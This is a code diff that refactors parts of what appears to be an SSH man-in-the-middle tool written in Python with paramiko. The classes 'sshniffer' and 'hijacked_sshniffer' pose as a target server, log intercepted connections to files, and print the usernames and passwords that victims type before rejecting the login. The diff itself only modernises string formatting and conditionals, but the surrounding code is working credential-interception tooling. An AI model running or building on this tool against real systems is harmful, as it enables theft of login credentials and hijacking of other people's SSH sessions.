@@ -114,16 +114,13 @@ class sshniffer(paramiko.server.ServerInterface):
     def __init__(self,endpoint,logfile):
         if args.debug:
             print_good("[^.^] Mitm server started!!")
-        self.endpoint = endpoint    
+        self.endpoint = endpoint
         self.logfile = logfile
         self.rhost,self.rport = endpoint.getpeername()
 
         self.netkit_flag = threading.Event()
-            
-        if cisco_mode:
-            self.netkit = lil_netkit(mode="cisco") 
-        else:
-            self.netkit = lil_netkit() 
+
+        self.netkit = lil_netkit(mode="cisco") if cisco_mode else lil_netkit() 
         
 
     def check_channel_request(self, kind, chanid):
@@ -157,10 +154,7 @@ class sshniffer(paramiko.server.ServerInterface):
         return True
     
     def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
-        if args.pty:
-            return True
-        else:
-            return False
+        return bool(args.pty)
 
     def retry_hack(self):
         if retry_hack: #check for global flag first
@@ -187,8 +181,8 @@ class hijacked_sshniffer(paramiko.server.ServerInterface):
         return paramiko.OPEN_SUCCEEDED
 
     def check_auth_password(self,username,password):
-        print_attn("[-.-] Username: %s%s" % (WARN,username))
-        print_attn("[>.>] password: %s%s" % (WARN,password))
+        print_attn(f"[-.-] Username: {WARN}{username}")
+        print_attn(f"[>.>] password: {WARN}{password}")
         return paramiko.AUTH_FAILED
 
     def get_allowed_auths(self, username):
@@ -207,10 +201,7 @@ class hijacked_sshniffer(paramiko.server.ServerInterface):
         return paramiko.AUTH_FAILED
 
     def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
-        if args.pty:
-            return True
-        else:
-            return False
+        return bool(args.pty)
 
 
 def main(args): 
@@ -339,16 +330,16 @@ def main(args):
 
 
 def client_handler_helper(sock,address,dst_sock,kill_switch,hijack_flag,inhook,outhook):
-    dt = datetime.datetime.today()
-    logfile_name = dt.__str__() + ".log" 
-    print_purp("[c.c] Logging to %s" % logfile_name)
-    
+    dt = datetime.datetime.now()
+    logfile_name = f"{dt.__str__()}.log"
+    print_purp(f"[c.c] Logging to {logfile_name}")
+
     try:
         os.mkdir('logs')
     except:
         pass
-    
-    with open("logs/%s"%(logfile_name),"w") as logfile:
+
+    with open(f"logs/{logfile_name}", "w") as logfile:
         logfile.write("<(^.^)>") 
         logfile.write("Inbound connection from %s:%d\n" %address)
         logfile.write("Posing as: %s:%d\n" % (DST_IP,DST_PORT))   
